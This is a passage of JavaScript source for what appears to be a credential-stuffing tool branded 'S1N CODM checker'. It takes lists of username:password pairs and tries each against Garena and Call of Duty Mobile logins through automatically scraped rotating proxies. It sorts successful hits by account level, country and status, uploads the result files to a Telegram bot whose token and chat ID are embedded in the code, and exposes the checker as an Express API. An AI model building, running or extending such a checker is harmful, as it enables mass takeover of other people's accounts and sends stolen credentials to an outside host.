                    console.log(`\n${COLORS['MAGENTA']}🎮 [${current_check_index_display}/${total_accounts}] CODM_FAIL: ${htmlEscape(fail_user)}:${password_from_file} | ${htmlEscape(fail_reason_clean).toUpperCase()}`);
                } else if (typeof final_result_for_account === 'string') {
                    failed_count += 1;
                    const result_clean = strip_ansi_codes(final_result_for_account);
                    fs.appendFileSync(main_output_files_handles['failed_general'], `${username}:${password_from_file} | ${result_clean.toUpperCase()}\n`, 'utf-8');
                    console.log(`\n${COLORS['RED']}❌ [${current_check_index_display}/${total_accounts}] FAILED: ${htmlEscape(username)}:${password_from_file} | ${htmlEscape(result_clean).toUpperCase()}`);
                } else {
                    failed_count += 1;
                    const unknown_result_str = strip_ansi_codes(String(final_result_for_account));
                    logging.error(`UNEXPECTED RESULT TYPE FOR ${username}: ${typeof final_result_for_account} - ${unknown_result_str.substring(0,200)}`);
                    fs.appendFileSync(main_output_files_handles['failed_general'], `${username}:${password_from_file} | [UNEXPECTED RESULT TYPE] ${unknown_result_str.substring(0,100).toUpperCase()}\n`, 'utf-8');
                    console.log(`\n${COLORS['RED']}❓ [${current_check_index_display}/${total_accounts}] UNKNOWN_ERR: ${htmlEscape(username)}:${password_from_file} | SEE LOGS.`);
                }

                checked_count += 1;
                account_index += 1;
                break; 
            } 
            
            if (account_index < total_accounts && check_delay > 0) {
                await time.sleep(check_delay);
            }
        } 
        
        const clean_progress_line_len = strip_ansi_codes(progress_line).length || 50;
        process.stdout.write("\r" + " ".repeat(clean_progress_line_len + 5) + "\r");


    } catch (e) {
        if (e.message.includes("ENOENT") || e.message.includes("INVALID FILE PATH")) { 
             console.log(`\n${COLORS['RED']}❌ ERROR: INPUT FILE NOT FOUND or similar issue: ${filePath}${COLORS['RESET']}`);
             logging.error(`ERROR: INPUT FILE NOT FOUND or similar issue: ${filePath} - ${e.message}`);
        } else {
             console.log(`\n${COLORS['RED']}💥 AN UNEXPECTED ERROR OCCURRED DURING BULK CHECK: ${strip_ansi_codes(e.message)}${COLORS['RESET']}`);
             logging.exception("UNEXPECTED ERROR DURING bulk_check LOOP", e);
        }
        throw e; 
    } finally {
        let closed_count = 0;
        const min_file_size_for_send_val = Buffer.from(OUTPUT_FILE_HEADER.toUpperCase()).length + Buffer.from(OUTPUT_FILE_FOOTER.toUpperCase()).length + 5;
        
        for (const [key, f_path_val] of Object.entries(main_output_files_handles)) {
            try {
                if (fs.existsSync(f_path_val)) {
                    fs.appendFileSync(f_path_val, OUTPUT_FILE_FOOTER.toUpperCase(), 'utf-8');
                    closed_count +=1; 
                    if (fs.statSync(f_path_val).size > min_file_size_for_send_val) {
                        generated_files_for_telegram.push(f_path_val);
                    }
                }
            } catch (e) {
                 logging.error(`ERROR FINALIZING MAIN FILE ${key} (${f_path_val}): ${e.message}`);
            }
        }
        if (Object.keys(main_output_files_handles).length > 0) {
            logging.info(`FINALIZED ${closed_count} MAIN OUTPUT FILES.`);
        }
        
        if (fs.existsSync(current_run_dir) && fs.statSync(current_run_dir).isDirectory()) {
            const relevant_subfolders_for_telegram = ["account_status", "account_country", "account_levels", "hits"]; 
            for (const subfolder_name of relevant_subfolders_for_telegram) {
                const subfolder_path = path.join(current_run_dir, subfolder_name);
                if (fs.existsSync(subfolder_path) && fs.statSync(subfolder_path).isDirectory()) {
                    const files_in_subfolder = fs.readdirSync(subfolder_path);
                    for (const file_in_subfolder of files_in_subfolder) {
                        if (file_in_subfolder.endsWith(".txt")) {
                            const file_path_to_add = path.join(subfolder_path, file_in_subfolder);
                            try {
                                if (fs.existsSync(file_path_to_add) && fs.statSync(file_path_to_add).size > min_file_size_for_send_val) {
                                    if (!generated_files_for_telegram.includes(file_path_to_add)) {
                                        generated_files_for_telegram.push(file_path_to_add);
                                        logging.info(`ADDING SORTED FILE TO TELEGRAM LIST: ${file_path_to_add}`);
                                    }
                                }
                            } catch (e) {
                                logging.error(`ERROR CHECKING SIZE OF SORTED FILE ${file_path_to_add}: ${e.message}`);
                            }
                        }
                    }
                }
            }
        }
        
        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && 
            TELEGRAM_BOT_TOKEN !== "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo" &&
            TELEGRAM_CHAT_ID !== "6542321044") {
             if (generated_files_for_telegram.length > 0) {
                  const telegram_caption_base = `S1N CODM CHECK FINISHED: ${run_folder_name_sanitized.toUpperCase()}`;
                  await send_files_to_telegram(generated_files_for_telegram, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, telegram_caption_base);
             } else {
                  logging.info("NO NON-EMPTY RESULT FILES GENERATED TO SEND TO TELEGRAM.");
             }
        } else if (total_accounts > 0) { 
            console.log(`${COLORS['YELLOW']}CRAFTED BY S1N | TELEGRAM: @YISHUX${COLORS['RESET']}`);
        }
        
        const end_time = time.time();
        const total_duration = end_time - (start_time || end_time); 
        const total_successful_hits_final = Object.values(level_summary_counts).reduce((s, c) => s + c, 0) - (level_summary_counts["UNKNOWN_LEVEL"] || 0);

        console.log(`\n${COLORS['CYAN']}${'='.repeat(15)} CHECK SUMMARY ${'='.repeat(15)}${COLORS['RESET']}`);
        console.log(`    DURATION: ${total_duration.toFixed(2)} SECONDS`);
        console.log(`    INPUT FILE: ${path.basename(filePath)}`);
        console.log(`    TOTAL ACCOUNTS LOADED: ${total_accounts}`);
        console.log(`    ACCOUNTS PROCESSED: ${checked_count}`);
        console.log(`    ${COLORS['GREEN']}CODM HITS: ${total_successful_hits_final}`);
        
        const sorted_level_keys = Object.keys(level_summary_counts)
            .filter(k => k !== "UNKNOWN_LEVEL" && level_summary_counts[k] > 0)
            .sort((a, b) => {
                const a_start = parseInt(a.split('-')[0], 10);
                const b_start = parseInt(b.split('-')[0], 10);
                return a_start - b_start;
            });
        if (level_summary_counts["UNKNOWN_LEVEL"] > 0) {
            sorted_level_keys.push("UNKNOWN_LEVEL");
        }

        for (const lvl_key of sorted_level_keys) {
            const count = level_summary_counts[lvl_key] || 0;
            if (count > 0) {
                const color = lvl_key !== "UNKNOWN_LEVEL" ? COLORS['GREEN'] : COLORS['GREY'];
                const display_lvl_key = lvl_key !== "UNKNOWN_LEVEL" ? `LEVEL ${lvl_key.toUpperCase()}` : "UNKNOWN LEVEL";
                console.log(`      ${color}- ${display_lvl_key}: ${count}${COLORS['RESET']}`);
            }
        }
        console.log(`    ${COLORS['MAGENTA']}CODM FAILED:    ${codm_failed_count}`);
        console.log(`    ${COLORS['RED']}GENERAL FAILED: ${failed_count}`);

        const delay_msg = check_delay > 0 ? `${check_delay}S` : "NONE";
        let proxy_source_for_summary = "NO";
        if (initial_proxy_count > 0) { 
            proxy_source_for_summary = `FILE/AUTOSCRAPE (${initial_proxy_count} INITIAL, ${(proxy_list ? proxy_list.length : 0)} REMAINING)`;
        }
        
        console.log(`    SETTINGS USED: DELAY=${delay_msg.toUpperCase()}, PROXY=${proxy_source_for_summary.toUpperCase()}`);
        console.log(`\n💾 OUTPUT LOCATION: '${current_run_dir}'`);
        
        const output_map_display = {
            'successful_unsorted': 'ALL SUCCESSFUL (UNSORTED)',
            'failed_codm': 'CODM FAILS',
            'failed_general': 'GENERAL FAILS'
        };
        const color_map_display = {'successful': COLORS['GREEN'], 'failed': COLORS['RED'], 'codm': COLORS['MAGENTA']};
        for (const [key, f_path_val] of Object.entries(main_file_paths)) {
            const prefix = (output_map_display[key] || key.replace(/_/g, ' ').toUpperCase());
            let cat_color = COLORS['GREY'];
            if (key.includes('successful')) cat_color = color_map_display['successful'];
            else if (key.includes('codm')) cat_color = color_map_display['codm'];
            else if (key.includes('general')) cat_color = color_map_display['failed'];
            try {
                if (fs.existsSync(f_path_val) && fs.statSync(f_path_val).size > min_file_size_for_send_val) {
                    console.log(`    ${cat_color}✓ ${prefix}: ${path.basename(f_path_val)}${COLORS['RESET']}`);
                }
            } catch (e) { /* ignore stat error if file removed */ }
        }
        
        const sorted_dirs_info = {
            "account_status": "SORTED BY ACCOUNT STATUS", 
            "account_country": "SORTED BY ACCOUNT COUNTRY",
            "account_levels": "SORTED BY ACCOUNT LEVELS",
            "hits": "CONDENSED HITS (ONE-LINE FORMAT)"
        };
        for (const [dir_name, desc] of Object.entries(sorted_dirs_info)) {
            const dir_path = path.join(current_run_dir, dir_name);
            if (fs.existsSync(dir_path) && fs.statSync(dir_path).isDirectory()) {
                 const files_in_dir = fs.readdirSync(dir_path).filter(f => fs.statSync(path.join(dir_path, f)).isFile());
                 if (files_in_dir.some(f => fs.statSync(path.join(dir_path, f)).size > min_file_size_for_send_val)) {
                    if (dir_name === "hits") {
                        console.log(`    ${COLORS['GREEN']}✓ ${desc.toUpperCase()}: IN '${dir_name}/${files_in_dir[0] || ''}'${COLORS['RESET']}`);
                    } else {
                        console.log(`    ${COLORS['GREEN']}✓ ${desc.toUpperCase()}: IN '${dir_name}/' FOLDER${COLORS['RESET']}`);
                    }
                 }
            }
        }
        
        console.log(`${COLORS['CYAN']}${'='.repeat(40)}${COLORS['RESET']}`);
        console.log(`\n${COLORS['BLUE_BOLD']}FINISHED PROCESSING.${COLORS['RESET']}`);

        return {
            message: "Bulk check finished.",
            durationSeconds: parseFloat(total_duration.toFixed(2)),
            inputFile: path.basename(filePath),
            totalAccountsLoaded: total_accounts,
            accountsProcessed: checked_count,
            codmHits: total_successful_hits_final,
            levelSummary: level_summary_counts,
            codmFailed: codm_failed_count,
            generalFailed: failed_count,
            settings: { delay: delay_msg, proxy: proxy_source_for_summary },
            outputDirectory: current_run_dir,
            generatedFiles: generated_files_for_telegram 
        };
    } 
}


// CLI interaction functions (translated but not primary for API)
function select_file_by_choice(prompt_message = "SELECT FILE", file_extension = ".txt", start_dir = ".") {
    logging.warning("select_file_by_choice is a CLI function and not directly usable in API request flow.");
    const files = fs.readdirSync(start_dir).filter(f => f.endsWith(file_extension) && fs.statSync(path.join(start_dir,f)).isFile());
    if (files.length > 0) return path.join(start_dir, files[0]);
    return null;
}

function select_delay_by_choice() {
    logging.warning("select_delay_by_choice is a CLI function.");
    return 3; 
}

function select_proxy_option_by_choice() {
    logging.warning("select_proxy_option_by_choice is a CLI function.");
    return "NO_PROXY"; 
}

function load_proxies_from_file(filepath) {
    const proxies = [];
    if (!filepath || !fs.existsSync(filepath) || !fs.statSync(filepath).isFile()) {
        logging.error(`PROXY FILE PATH IS INVALID OR FILE DOES NOT EXIST: ${filepath}`);
        return [];
    }
    try {
        const fileContent = fs.readFileSync(filepath, 'utf-8');
        const lines = fileContent.split(/\r?\n/);
        lines.forEach((line, line_num) => {
            let proxy_url = line.trim();
            if (proxy_url && !proxy_url.startsWith('#')) {
                if (!/^(http|https|socks4|socks5):\/\//.test(proxy_url)) {
                    proxy_url = `http://${proxy_url}`; 
                }
                try {
                    const parsed = new URL(proxy_url); 
                    if (['http:', 'https:', 'socks4:', 'socks5:'].includes(parsed.protocol) && parsed.hostname) {
                        proxies.push(proxy_url);
                    } else {
                         logging.warning(`SKIPPING INVALID PROXY FORMAT IN ${path.basename(filepath)} LINE ${line_num+1}: ${proxy_url.substring(0,50)}`);
                    }
                } catch (urlError) {
                    logging.warning(`SKIPPING UNPARSEABLE PROXY IN ${path.basename(filepath)} LINE ${line_num+1}: ${proxy_url.substring(0,50)}`);
                }
            }
        });
        logging.info(`LOADED ${proxies.length} VALID PROXIES FROM ${path.basename(filepath)}.`);
        if (proxies.length === 0) logging.warning(`NO VALID PROXIES FOUND IN ${path.basename(filepath)}.`);
        return proxies;
    } catch (e) {
        logging.exception(`UNEXPECTED ERROR LOADING PROXIES FROM ${filepath}`, e);
        console.log(`${COLORS['RED']}UNEXPECTED ERROR LOADING PROXY FILE: ${e.message}${COLORS['RESET']}`);
        return [];
    }
}

async function fetch_proxies_from_online_sources(timeout = PROXYSCRAPE_FETCH_TIMEOUT) {
    const all_proxies = new Set();
    logging.info(`Attempting to fetch proxies from ${PROXY_SOURCE_URLS.length} online sources.`);
    
    for (const url of PROXY_SOURCE_URLS) {
        logging.info(`Fetching from: ${url}`);
        process.stdout.write(`${COLORS['CYAN']}  Fetching proxies from ${new URL(url).hostname}...${COLORS['RESET']}`);
        try {
            const response = await axios.get(url, { timeout: timeout * 1000 });
            if (response.status !== 200) throw new Error(`HTTP ${response.status}`);
            const raw_proxies_from_source = String(response.data).trim().split(/\r?\n/);
            
            if (raw_proxies_from_source.length === 0 || (raw_proxies_from_source.length === 1 && !raw_proxies_from_source[0].trim())) {
                logging.warning(`Source ${url} returned an empty or whitespace-only list.`);
                process.stdout.write(`${COLORS['YELLOW']} Empty list.${COLORS['RESET']}\n`);
                continue;
            }

            let count_from_source = 0;
            raw_proxies_from_source.forEach(line_content => {
                let proxy_candidate = line_content.trim();
                if (proxy_candidate && !proxy_candidate.startsWith('#')) {
                    if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$/.test(proxy_candidate)) {
                        all_proxies.add(`http://${proxy_candidate}`);
                        count_from_source += 1;
                    } 
                    else if (/^(http|https|socks4|socks5):\/\//.test(proxy_candidate)) {
                        try {
                            const parsed = new URL(proxy_candidate);
                            if (parsed.protocol && parsed.hostname) {
                                all_proxies.add(proxy_candidate);
                                count_from_source += 1;
                            }
                        } catch (e) { /* ignore parse error */ }
                    }
                    else if (proxy_candidate.includes(':')) { 
                        all_proxies.add(`http://${proxy_candidate}`);
                        count_from_source +=1;
                    }
                }
            });
            
            process.stdout.write(`${COLORS['GREEN']} Done (${count_from_source} added).${COLORS['RESET']}\n`);
            logging.info(`Fetched ${count_from_source} potential proxies from ${url}.`);
        } catch (e) {
            if (e.code === 'ECONNABORTED') {
                logging.error(`Timeout fetching proxies from ${url}.`);
                process.stdout.write(`${COLORS['RED']} Timeout.${COLORS['RESET']}\n`);
            } else {
                logging.error(`Error fetching proxies from ${url}: ${e.message}`);
                process.stdout.write(`${COLORS['RED']} Error: ${strip_ansi_codes(e.message.split('\n')[0].substring(0,50))}...${COLORS['RESET']}\n`);
            }
        }
        await time.sleep(0.1);
    }
    
    const final_proxy_list = Array.from(all_proxies);
    random.shuffle(final_proxy_list);
    logging.info(`Fetched a total of ${final_proxy_list.length} unique proxies from all sources.`);
    if (final_proxy_list.length === 0) {
        logging.warning("No proxies fetched from any online source.");
    }
    return final_proxy_list;
}

// --- Express API Setup ---
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json()); // Middleware to parse JSON bodies

// Global error handler for Express
app.use((err, req, res, next) => {
    logging.error("Unhandled Express error:", err.stack || err.message || err);
    res.status(500).json({ error: "Internal Server Error", details: err.message });
});


app.post('/api/bulk-check', async (req, res) => {
    clear_screen(); display_banner(); 
    console.log(`${COLORS['GREEN']}API /api/bulk-check CALLED.${COLORS['RESET']}`);

    const {
        accountFilePath, 
        checkDelay = 0,  
        proxyOption = "NO_PROXY", 
        proxyFilePath = null, 
        runFolderName = null 
    } = req.body;

    if (!accountFilePath) {
        return res.status(400).json({ error: "accountFilePath is required." });
    }
    if (!fs.existsSync(accountFilePath) || !fs.statSync(accountFilePath).isFile()) {
        return res.status(400).json({ error: `Account file not found or is not a file: ${accountFilePath}` });
    }


    logging.info(`Received bulk check request for file: ${accountFilePath}`);
    logging.info(`Check Delay: ${checkDelay}, Proxy Option: ${proxyOption}`);
    if (proxyOption === "USER_FILE") logging.info(`Proxy File Path: ${proxyFilePath}`);
    if (runFolderName) logging.info(`Custom Run Folder Name: ${runFolderName}`);


    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID ||
       TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" || TELEGRAM_CHAT_ID === "YOUR_TELEGRAM_CHAT_ID" ||
       TELEGRAM_BOT_TOKEN === "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo" || TELEGRAM_CHAT_ID === "6542321044") {
        console.log(`${COLORS['YELLOW']}⚠️ WARNING: TELEGRAM BOT TOKEN/CHAT ID NOT SET OR USING PLACEHOLDERS. FILES WILL NOT BE SENT.${COLORS['RESET']}`);
    } else {
        console.log(`${COLORS['GREEN']}CRAFTED BY S1N | TELEGRAM: @YISHUX${COLORS['RESET']}`);
    }
    
    let proxy_list_loaded = null;
    let proxy_source_display = "DISABLED";

    if (proxyOption === "USER_FILE") {
        if (proxyFilePath && fs.existsSync(proxyFilePath) && fs.statSync(proxyFilePath).isFile()) {
            proxy_list_loaded = load_proxies_from_file(proxyFilePath);
            if (proxy_list_loaded && proxy_list_loaded.length > 0) {
                console.log(`${COLORS['GREEN']}PROXY FILE ENABLED: ${proxy_list_loaded.length} PROXIES FROM ${path.basename(proxyFilePath)}.${COLORS['RESET']}`);
                proxy_source_display = `USER FILE (${proxy_list_loaded.length} PROXIES)`;
            } else {
                console.log(`${COLORS['RED']}NO VALID PROXIES IN FILE. DISABLING PROXY USE.${COLORS['RESET']}`);
                proxy_source_display = "DISABLED (USER FILE EMPTY/INVALID)";
            }
        } else {
            console.log(`${COLORS['YELLOW']}PROXY FILE PATH INVALID OR NOT PROVIDED. DISABLING PROXY USE.${COLORS['RESET']}`);
            proxy_source_display = "DISABLED (USER FILE PATH INVALID/MISSING)";
        }
    } else if (proxyOption === "AUTOSCRAPE") {
        console.log(`${COLORS['CYAN']}ATTEMPTING TO FETCH PROXIES FROM ONLINE SOURCES...${COLORS['RESET']}`);
        proxy_list_loaded = await fetch_proxies_from_online_sources();
        if (proxy_list_loaded && proxy_list_loaded.length > 0) {
            console.log(`${COLORS['GREEN']}FETCHED ${proxy_list_loaded.length} PROXIES FROM ONLINE SOURCES.${COLORS['RESET']}`);
            proxy_source_display = `AUTOSCRAPE (${proxy_list_loaded.length} PROXIES)`;
        } else {
            console.log(`${COLORS['RED']}FAILED TO FETCH/LOAD PROXIES. PROCEEDING WITHOUT PROXIES.${COLORS['RESET']}`);
            proxy_source_display = "DISABLED (AUTOSCRAPE FETCH FAILED)";
        }
    } else {
        console.log(`${COLORS['GREEN']}PROXY DISABLED.${COLORS['RESET']}`);
    }
    
    const session_initial_cookies_tuple = starting_cookies();
    const [, cookie_source_msg] = session_initial_cookies_tuple;

    console.log(`${COLORS['GREEN']}SELECTED ACCOUNT FILE: ${COLORS['WHITE']}${path.basename(accountFilePath)}${COLORS['RESET']}`);
    console.log(`${COLORS['GREEN']}SELECTED DELAY: ${COLORS['WHITE']}${checkDelay}S${COLORS['RESET']}`);
    console.log(`${COLORS['GREEN']}PROXY MODE: ${COLORS['WHITE']}${proxy_source_display.toUpperCase()}${COLORS['RESET']}`);
    if (cookie_source_msg) {
        console.log(`${COLORS['GREEN']}COOKIE SOURCE: ${COLORS['WHITE']}${cookie_source_msg}${COLORS['RESET']}`);
    }
    
    console.log(`\n${COLORS['GREEN']}PREPARING TO CHECK ACCOUNTS...${COLORS['RESET']}`);
    await time.sleep(2.0); 
    clear_screen(); display_banner();

    try {
        const summary = await bulk_check(
            accountFilePath,
            session_initial_cookies_tuple,
            Number(checkDelay), 
            proxy_list_loaded, 
            runFolderName
        );
        res.status(200).json({ status: "completed", summary: summary });
    } catch (error) {
        logging.error("Error during bulk_check API call:", error.message, error.stack);
        res.status(500).json({ error: "Bulk check failed", details: error.message });
    }
});


app.post('/api', async (req, res) => {
    // clear_screen(); display_banner(); // Optional for pure API endpoint, kept for style consistency if desired
    console.log(`${COLORS['GREEN']}API /api/check-account CALLED.${COLORS['RESET']}`);
    logging.info('API /api/check-account called.');

    const { user, password } = req.body;

    if (!user || !password) {
        logging.warning('/api/check-account: Missing user or password in request body.');
        return res.status(400).json({ error: "User and password are required." });
    }

    logging.info(`/api/check-account: Checking account for user: ${user.substring(0,3)}...`); // Log sanitized user

    try {
        const date_timestamp = get_current_timestamp();
        const session_initial_cookies_tuple = starting_cookies();
        
        const result = await check_account(
            user,
            password,
            date_timestamp,
            session_initial_cookies_tuple,
            null, // proxies: For single check, typically direct connection
            null, // datadome_for_prelogin_attempt: Let check_account handle it
            REQUEST_TIMEOUT
        );

        if (typeof result === 'object' && result !== null && !Array.isArray(result)) {
            logging.info(`/api/check-account: Success for user ${user.substring(0,3)}.... Level: ${(result.codm_details || {}).level}`);
            return res.status(200).json({ status: "success", data: result });
        } else if (Array.isArray(result) && result[0] === "CODM_FAILURE") {
            const [, fail_user, , fail_reason] = result;
            const clean_reason = strip_ansi_codes(fail_reason);
            logging.warning(`/api/check-account: CODM_FAILURE for user ${fail_user.substring(0,3)}.... Reason: ${clean_reason}`);
            return res.status(200).json({ 
                status: "partial_success",
                message: "Garena login successful, but CODM check failed.",
                details: clean_reason,
                error_type: "CODM_FAILURE",
                username: fail_user
            });
        } else if (typeof result === 'string') {
            const error_message = strip_ansi_codes(result);
            logging.warning(`/api/check-account: Failed for user ${user.substring(0,3)}.... Reason: ${error_message}`);

            if (error_message.startsWith("[🤖] CAPTCHA")) {
                return res.status(429).json({ status: "error", message: error_message, error_type: "CAPTCHA" });
            } else if (error_message.includes("INCORRECT PASSWORD")) {
                return res.status(401).json({ status: "error", message: error_message, error_type: "INCORRECT_PASSWORD" });
            } else if (error_message.startsWith("[👻] ACCOUNT DOESN'T EXIST")) {
                 return res.status(404).json({ status: "error", message: error_message, error_type: "ACCOUNT_NOT_FOUND" });
            } else if (error_message.includes("FORBIDDEN (403)")) {
                return res.status(403).json({ status: "error", message: error_message, error_type: "FORBIDDEN" });
            } else if (error_message.startsWith("[⏱️]") || error_message.includes("TIMEOUT")) {
                return res.status(504).json({ status: "error", message: error_message, error_type: "TIMEOUT" });
            } else if (error_message.startsWith("[🔴]") || error_message.startsWith("[🔌]") || error_message.includes("CONNECTION ERROR")) {
                return res.status(502).json({ status: "error", message: error_message, error_type: "CONNECTION_ERROR" });
            }
            return res.status(400).json({ status: "error", message: error_message, error_type: "CHECK_FAILED" });
        } else {
            logging.error(`/api/check-account: Unexpected result type for user ${user.substring(0,3)}.... Result: ${JSON.stringify(result).substring(0,200)}`);
            return res.status(500).json({ error: "Internal server error: Unexpected result type from checker." });
        }

    } catch (error) {
        logging.error(`Error during /api/check-account for user ${user.substring(0,3)}...:`, error.message, error.stack);
        res.status(500).json({ error: "Internal server error during account check", details: error.message });
    }
});


// Mimic Python's __main__ block
async function main_api_start() {
    const log_dir = "logs";
    fsExtra.ensureDirSync(log_dir);
    const log_file = path.join(log_dir, `checker_api_run_${get_current_timestamp()}.log`);
    
    logging.basicConfig({
        level: logging.INFO, 
        handlers: [new logging.FileHandler(log_file, 'utf-8')],
    });
    
    logging.info(`--- API SCRIPT STARTED (PID: ${process.pid}) ---`);
    logging.info(`NODE.JS VERSION: ${process.version}, PLATFORM: ${platform.system()} (${platform.release()})`);
    logging.info(`LOG LEVEL: ${logging.getLevelName(logging.getLogger().level)}`);
    console.log(`${COLORS['GREY']}LOGGING DETAILED INFO TO: ${log_file}${COLORS['RESET']}`);

    fsExtra.ensureDirSync("S1N-CODM");

    app.listen(PORT, () => {
        clear_screen();
        display_banner();
        console.log(`${COLORS['GREEN']}S1N CODM CHECKER API IS LISTENING ON PORT ${PORT}${COLORS['RESET']}`);
        console.log(`${COLORS['YELLOW']}Send POST requests to /api/bulk-check (for bulk) or /api/check-account (for single) with parameters in JSON body.${COLORS['RESET']}`);
        console.log(`${COLORS['CYAN']}For /api/bulk-check: Required "accountFilePath" (string, server-side path). Optional: "checkDelay", "proxyOption", "proxyFilePath", "runFolderName".${COLORS['RESET']}`);
        console.log(`${COLORS['CYAN']}For /api/check-account: Required "user" (string), "password" (string).${COLORS['RESET']}`);
    });
}

if (require.main === module) { 
    main_api_start().catch(err => {
        const clean_error_msg = strip_ansi_codes(String(err.message || err));
        console.error(`${COLORS['RED_BG']}${COLORS['WHITE']} 💥 A CRITICAL ERROR OCCURRED DURING API STARTUP: ${htmlEscape(clean_error_msg)} ${COLORS['RESET']}`);
        logging.critical("CRITICAL ERROR IN API STARTUP", err);
        process.exit(1);
    });
}

process.on('SIGINT', () => {
    console.log(`\n${COLORS['RED']}🛑 USER INTERRUPTION (SIGINT). EXITING GRACEFULLY...${COLORS['RESET']}`);
    logging.warning("USER INTERRUPTION (SIGINT). EXITING.");
    process.exit(0);
});

process.on('exit', (code) => {
    logging.info(`--- SCRIPT FINISHED WITH CODE ${code} ---`);
    console.log(Style.RESET_ALL); 
});
